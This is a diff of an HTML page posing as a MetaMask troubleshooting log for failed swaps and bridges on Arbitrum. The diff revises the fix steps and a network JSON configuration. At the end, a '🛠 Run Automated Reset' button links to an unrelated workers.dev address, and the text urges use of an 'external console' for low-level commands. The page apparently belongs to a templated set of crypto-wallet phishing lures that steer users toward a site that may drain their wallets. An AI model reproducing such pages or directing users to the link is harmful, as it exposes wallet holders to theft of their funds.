@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #121214;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,36 @@
 <h1>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience failures when attempting to swap or bridge assets on the Arbitrum network using the Metamask extension, resulting in transaction errors and failed operations.</li>
+<li>Users encounter a failure when attempting to swap or bridge assets on the Arbitrum network through the Metamask extension, resulting in an error message indicating the transaction cannot be completed.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, specifically related to the handling of layer 2 transactions and the bridge protocol.</li>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, potentially caused by outdated extension versions, incorrect network configuration, or insufficient gas limits.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the Metamask extension to the latest version to ensure compatibility with the Arbitrum network.</li>
-<li>Configure the Arbitrum network settings manually in the Metamask extension to ensure correct RPC and bridge settings.</li>
-<li>Use the following JSON configuration to override the default bridge settings:</li>
+<li>Update Metamask extension to the latest version</li>
+<li>Configure the Arbitrum network manually with the correct RPC and chain ID</li>
+<li>Increase the gas limit for transactions on the Arbitrum network</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;rpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://arb1.arbitrum.io/rpc&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;bridge&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://bridge.arbitrum.io&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42161</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42161</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Arbitrum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rpcUrls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://arb1.arbitrum.io/rpc&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;nativeCurrency&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Ether&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for advanced debugging and configuration.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured.</li>
-<li>Arbitrum network added to the Metamask extension.</li>
-<li>Latest version of the Metamask extension updated and installed.</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed
+* Arbitrum network configuration knowledge
+* Basic understanding of Ethereum transaction settings
+For further debugging, consider utilizing an external console to execute low-level commands.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
